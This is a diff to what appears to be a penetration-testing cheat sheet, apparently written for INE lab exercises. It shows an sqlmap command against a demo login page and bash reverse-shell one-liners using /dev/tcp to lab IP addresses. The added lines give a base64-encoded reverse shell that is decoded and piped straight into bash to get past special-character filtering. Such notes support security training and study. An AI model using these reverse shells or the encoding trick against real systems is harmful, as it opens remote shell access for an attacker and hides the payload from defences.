@@ -273,6 +273,11 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 #!/bin/bash
 bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
 bash -c \'bash -i >& /dev/tcp/192.132.186.2/4242 0>&1\'
+
+**Encoded payload may solve problems when dealing with special characters:**
+1. echo '/bin/bash -c "bash -i >& /dev/tcp/192.231.23.2/54321 0>&1"' | base64 -w0;echo // pass the result of this command to step 2.
+2. echo L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4yMzEuMjMuMi81NDMyMSAwPiYxIgo= | base64 -d | bash
+
 ```
 ## Listener
 ```bash
